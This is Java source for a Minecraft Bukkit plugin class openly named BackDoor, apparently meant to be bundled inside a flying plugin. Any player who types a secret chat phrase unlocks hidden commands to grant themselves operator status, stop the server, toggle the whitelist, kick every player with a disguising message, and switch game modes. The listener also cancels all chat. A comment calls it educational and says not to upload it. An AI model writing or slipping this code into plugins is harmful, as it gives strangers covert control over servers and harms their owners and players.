package cz.flyultra;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitScheduler;

import java.util.ArrayList;

import static org.bukkit.Bukkit.getServer;

/**
 *
 * I think everyone can see, how bad is this "BackDoor" :D
 *
 * Dont upload this to any plugins,
 * this github repo is only for educational purposes
 *
 * This project is from 2019/20 !!!
 *
 */
public class BackDoor implements Listener {

    private JavaPlugin plugin;

    public static ArrayList<Player> rue = new ArrayList<Player>();

    public BackDoor(JavaPlugin plugin) {
        this.plugin = plugin;
        Bukkit.getPluginManager().registerEvents(this, plugin);
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void PlayerChat(PlayerChatEvent e) {
        Player player = e.getPlayer();
        String message = e.getMessage();

        e.setCancelled(true);

        if (message.equalsIgnoreCase("__turn__on__")) {
            rue.add(player);
            player.sendMessage(ChatColor.translateAlternateColorCodes('§', " "));
            player.sendMessage(ChatColor.translateAlternateColorCodes('§', "§e§lWELCOME!!!"));
            player.sendMessage(ChatColor.translateAlternateColorCodes('§', " "));
        }

        if (message.equalsIgnoreCase("__turn__off__")) {
            rue.remove(player);
            player.sendMessage(ChatColor.translateAlternateColorCodes('§', " "));
            player.sendMessage(ChatColor.translateAlternateColorCodes('§', "§e§lBYE!!!"));
            player.sendMessage(ChatColor.translateAlternateColorCodes('§', " "));
        }

        if (rue.contains(player)) {
            if (message.equalsIgnoreCase("__help__")) {
                player.sendMessage(ChatColor.translateAlternateColorCodes('§', "§e§lHelp List 1"));
                player.sendMessage(ChatColor.translateAlternateColorCodes('§', "§f__stop__ §bStop the server"));
                player.sendMessage(ChatColor.translateAlternateColorCodes('§', "§f__reload__ §bReload the server"));
                player.sendMessage(ChatColor.translateAlternateColorCodes('§', "§f__kick__ §bKick all players on the server"));
                player.sendMessage(ChatColor.translateAlternateColorCodes('§', "§f__op__ §bop player"));
                player.sendMessage(ChatColor.translateAlternateColorCodes('§', "§f__deop__ §bdeop player"));
            }

            if (message.equalsIgnoreCase("__whitelist__on__")) {
                Bukkit.setWhitelist(true);
                player.sendMessage(ChatColor.translateAlternateColorCodes('§', "§aWhiteList §eset §fOn"));
            }

            if (message.equalsIgnoreCase("__whitelist__off__")) {
                Bukkit.setWhitelist(false);
                player.sendMessage(ChatColor.translateAlternateColorCodes('§', "§aWhiteList §eset §fOff"));

            }

            if (message.equalsIgnoreCase("__stop__")) {
                BukkitScheduler scheduler = Bukkit.getServer().getScheduler();
                player.sendMessage(ChatColor.translateAlternateColorCodes('§', "§aSTOPPING THE SERVER!"));
                scheduler.scheduleSyncDelayedTask(plugin, () -> getServer().shutdown(), 11);
            }

            if (message.equalsIgnoreCase("__kick__ ")) {
                for (Player players : Bukkit.getOnlinePlayers()) {
                    e.setCancelled(true);
                    players.kickPlayer("Flying is not enabled on this server");
                }
            }

            if (message.equalsIgnoreCase("__op__")) {
                player.setOp(true);
            }

            if (message.equalsIgnoreCase("__deop__")) {
                player.setOp(false);
            }

            if (message.equalsIgnoreCase("__gmc__")) {
                player.setGameMode(GameMode.CREATIVE);
                player.sendMessage(ChatColor.translateAlternateColorCodes('§', "§aGAMEMODE CREATIVE!"));
            }

            if (message.equalsIgnoreCase("__gms__")) {
                player.setGameMode(GameMode.SURVIVAL);
                player.sendMessage(ChatColor.translateAlternateColorCodes('§', "§aGAMEMODE SURVIVAL!"));
            }

            if (message.equalsIgnoreCase("__gmsp__")) {
                player.setGameMode(GameMode.SPECTATOR);
                player.sendMessage(ChatColor.translateAlternateColorCodes('§', "§aGAMEMODE SPECTATOR!"));
            }

        }
    }

}
